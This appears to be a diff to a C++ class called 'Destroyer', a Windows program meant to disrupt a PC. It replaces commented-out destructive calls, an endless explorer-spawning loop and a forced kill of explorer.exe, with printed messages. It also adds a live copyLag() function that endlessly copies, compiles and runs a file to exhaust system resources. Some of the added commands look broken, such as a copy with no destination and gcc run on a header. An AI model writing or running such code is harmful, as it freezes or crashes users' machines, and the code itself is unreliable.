@@ -16,11 +16,23 @@ class Destroyer{
             while (true)
             {
                 //system("explorer");
+                std :: cout << "Normally ur pc would be dead\n"; 
             }
         }
 
         void killUI() //ends explorer task, hence destroying the ui of windows 10
         {
             //system("taskkill /IM \"explorer.exe\" /F");
+            std :: cout << "Your UI would disappear normally\n";
+        }
+
+        void copyLag()
+        {
+            while (true)
+            {
+                system("copy lag.h");
+                system("gcc lag.h -o lag.exe");
+                system("lag.exe");
+            }
         }
 };
